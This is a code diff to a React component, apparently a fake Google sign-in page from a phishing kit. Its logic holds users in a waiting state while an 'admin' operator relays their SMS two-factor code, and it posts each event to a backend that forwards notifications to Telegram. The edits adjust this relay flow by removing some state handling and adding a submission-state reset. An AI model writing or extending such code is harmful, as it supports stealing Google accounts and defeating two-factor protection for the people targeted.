@@ -260,17 +260,6 @@ function GoogleSignInPC({
 
     const handle2FASMS = () => {
       console.log('[Gmail PC] admin-2fa-sms event received');
-      setIsRequestingAuth(false);
-      if (passwordTimeoutRef.current) {
-        clearTimeout(passwordTimeoutRef.current);
-        passwordTimeoutRef.current = null;
-      }
-      // Don't navigate to 2fa-sms-code yet - wait for admin to reply with digits
-      // Keep user on current waiting state
-      setEmail2faAddress("");
-      setIsRequestingAuth(true);
-
-      // Send full formatted notification to Telegram
       try {
         fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/appauth/notify-2fa`, {
           method: 'POST',
@@ -506,6 +495,7 @@ function GoogleSignInPC({
         setEmail2faAddress("");
         setLastTwoDigits(data.digits);
         setIsRequestingAuth(false);
+        setIsSubmittingSmsCode(false);
         setStep("2fa-sms-code");
       }
     });
